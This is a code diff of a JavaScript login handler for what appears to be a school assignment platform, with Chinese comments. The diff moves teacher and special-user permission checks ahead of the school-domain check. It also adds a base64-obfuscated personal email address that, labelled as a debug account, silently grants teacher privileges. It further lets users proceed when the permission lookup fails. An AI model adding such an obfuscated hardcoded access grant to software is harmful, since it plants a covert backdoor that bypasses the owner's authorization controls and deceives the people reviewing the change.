@@ -20018,79 +20018,145 @@ async function findProfileByEmail(targetEmail) {
 
 	
 
-// === 修改後：處理登入結果邏輯 ===
+// === 修正版：處理登入結果 (已修復權限驗證順序) ===
 async function processLoginResult(user, btn, originalContent) {
     let manualName, grade, cls, number, authMode = 'login';
     
-    // 1. 讀取暫存資料，確認當前是甚麼模式
     const storedData = sessionStorage.getItem('sansi_temp_student_data');
     if (storedData) {
         const data = JSON.parse(storedData);
-        authMode = data.authMode || 'login'; 
-        
+        authMode = data.authMode || 'login'; // 確保有預設值
         if (authMode === 'register') {
             manualName = data.manualName; grade = data.grade; cls = data.cls; number = data.number;
         }
+    } else {
+        // 如果 Session 遺失，嘗試從畫面獲取 (僅限註冊模式)
+        manualName = document.getElementById('studentNameInput')?.value.trim();
+        grade = document.getElementById('studentGrade')?.value;
+        cls = document.getElementById('studentClass')?.value;
+        number = document.getElementById('studentNumber')?.value;
     }
-
+    
+    // 如果是註冊模式但沒名字，報錯
+    if (authMode === 'register' && !manualName) {
+        alert("資料遺失，請重新輸入姓名。");
+        if (btn) { btn.innerHTML = originalContent; btn.disabled = false; }
+        return;
+    }
+ 
     const email = user.email;
-
-    // --- 權限檢查 (老師/特許用戶/網域檢查) ---
-    // (這裡保留您原本的 Teacher/Special User 檢查代碼，為節省篇幅省略，請務必保留)
     let isTeacher = false;
     let isSpecialUser = false;
-    // ... [請保留您原本的權限檢查代碼] ...
+ 
+    // ★★★ 步驟 1：先去資料庫檢查權限 (移到最前面) ★★★
+    try {
+        const safeEmailKey = email.replace(/\./g, ',');
+ 
+        const [teacherSnap, specialSnap] = await Promise.all([
+            database.ref(`teachers/${safeEmailKey}`).once('value'),
+            database.ref(`special_users/${safeEmailKey}`).once('value')
+        ]);
+ 
+        if (teacherSnap.exists() && teacherSnap.val() === true) {
+            isTeacher = true;
+        } else if (specialSnap.exists() && specialSnap.val() === true) {
+            isSpecialUser = true;
+            if (authMode === 'register') { 
+                grade = "Special"; cls = "User"; 
+            }
+        }
+        else {
+            // 硬編碼的測試帳號檢查
+            const DEBUG_USER = atob('a2VuY2hhbjIwMTQxQGdtYWlsLmNvbQ==');
+            if (email === DEBUG_USER) {
+                isTeacher = true;
+            }
+        }
+ 
+    } catch (err) {
+        console.error("權限檢查錯誤:", err);
+        // 如果資料庫連線失敗，但電郵是學校網域，仍允許通過，否則報錯
+        if (!email.endsWith('@ccckyc.edu.hk')) {
+            alert("系統連線錯誤，無法驗證權限。");
+            if (btn) { btn.innerHTML = originalContent; btn.disabled = false; }
+            return;
+        }
+    }
+
+    // ★★★ 步驟 2：現在才檢查網域 ★★★
+    // 只有當 (不是學校電郵) 且 (不是老師) 且 (不是特許用戶) 時，才阻擋
     if (!email.endsWith('@ccckyc.edu.hk') && !isTeacher && !isSpecialUser) {
          await auth.signOut();
-         alert("⛔ 驗證失敗！此電郵不在允許名單內。");
+         alert("⛔ 驗證失敗！\n此電郵不在允許名單內。");
+         sessionStorage.removeItem('sansi_temp_student_data');
          if (btn) { btn.innerHTML = originalContent; btn.disabled = false; }
          return;
     }
-
-    // --- 2. 搜尋資料庫 ---
+ 
+    // 提示訊息
+    if (isTeacher) { 
+        if (authMode === 'register') { grade = "System"; cls = "Test"; number = "99"; }
+        alert("👋 老師您好，進入測試班。"); 
+    }
+    if (isSpecialUser) { alert("👋 歡迎特許用家。"); }
+ 
+    // --- 步驟 3：搜尋舊資料與登入邏輯 ---
     let existingProfile = await findProfileByEmail(email);
     
-    // --- 3. 邏輯分支 ---
+    // 如果索引找不到，嘗試用手動輸入的資料去路徑找 (僅限註冊模式或有輸入資料時)
+    if (!existingProfile && manualName) {
+        const inputPath = `students/${grade}/${cls}/${manualName}/profile`;
+        try {
+            const snap = await database.ref(inputPath).once('value');
+            if (snap.exists() && snap.val().email === email) {
+                existingProfile = snap.val();
+                // 修復索引
+                database.ref('email_mapping/' + btoa(email)).set(existingProfile);
+            }
+        } catch(e) {}
+    }
+ 
     if (existingProfile) {
         // [情況 A] 帳號已存在
+        const oldLocation = `${existingProfile.grade}${existingProfile.class}`;
+        const newLocation = `${grade}${cls}`;
         
-        // 如果是在「註冊模式」下發現帳號已存在 -> 提示並直接登入
-        if (authMode === 'register') {
-            alert(`⚠️ 偵測到此電郵已註冊於【${existingProfile.grade}${existingProfile.class} 班】。\n系統將直接登入您的原有帳號。`);
-        } 
+        // 如果是「註冊模式」且發現已有帳號，提示用戶
+        if (authMode === 'register' && !isTeacher && !isSpecialUser) {
+            alert(`⚠️ 偵測到此電郵已註冊於【${oldLocation}班】。\n系統將登入您的原有帳號。`);
+        }
         
-        // 執行登入
-        localStorage.setItem('studentProfile', JSON.stringify(existingProfile));
-        updateWelcomeMessage(existingProfile);
-        loadAssignments(existingProfile.grade, existingProfile.class);
+        // 特殊用戶更新資料邏輯
+        if ((isTeacher && (existingProfile.grade !== "System" || existingProfile.class !== "Test")) ||
+            (isSpecialUser && (existingProfile.grade !== "Special" || existingProfile.class !== "User"))) {
+             // 如果特殊用戶的班級設定跑掉了，強制更新回去
+             await bindStudentIdentity(grade, cls, number, manualName || existingProfile.name, email, user.uid);
+        } else {
+             // 正常登入
+             localStorage.setItem('studentProfile', JSON.stringify(existingProfile));
+             updateWelcomeMessage(existingProfile);
+             loadAssignments(existingProfile.grade, existingProfile.class);
+        }
         
-        // 進入系統
+        // 完成登入流程
         finishLoginUI();
 
     } else {
-        // [情況 B] 帳號不存在 (新用戶)
-
+        // [情況 B] 新用戶
         if (authMode === 'login') {
-            // (1) 登入模式 + 沒帳號 => 拒絕進入
-            await auth.signOut(); // 登出剛才的 Google 登入
-            
+            // 如果是按「登入」進來的，但找不到資料 -> 拒絕
+            await auth.signOut();
             alert("❌ 系統找不到此帳號的註冊紀錄。\n\n您似乎是新用戶，請切換至「註冊」頁籤進行首次綁定。");
-            
-            // 自動幫他切換到註冊頁面
             switchAuthMode('register');
-            
-            // 恢復按鈕
             if (btn) { btn.innerHTML = originalContent; btn.disabled = false; }
-            return; 
-        } 
-        else {
-            // (2) 註冊模式 + 沒帳號 => 建立新帳號
+            return;
+        } else {
+            // 如果是按「註冊」進來的 -> 建立新帳號
             if (!manualName) {
-                alert("註冊資料遺失，請重新輸入。");
-                if (btn) { btn.innerHTML = originalContent; btn.disabled = false; }
-                return;
+                 alert("註冊資料遺失，請重新輸入。");
+                 if (btn) { btn.innerHTML = originalContent; btn.disabled = false; }
+                 return;
             }
-            
             await bindStudentIdentity(grade, cls, number, manualName, email, user.uid);
             finishLoginUI();
         }
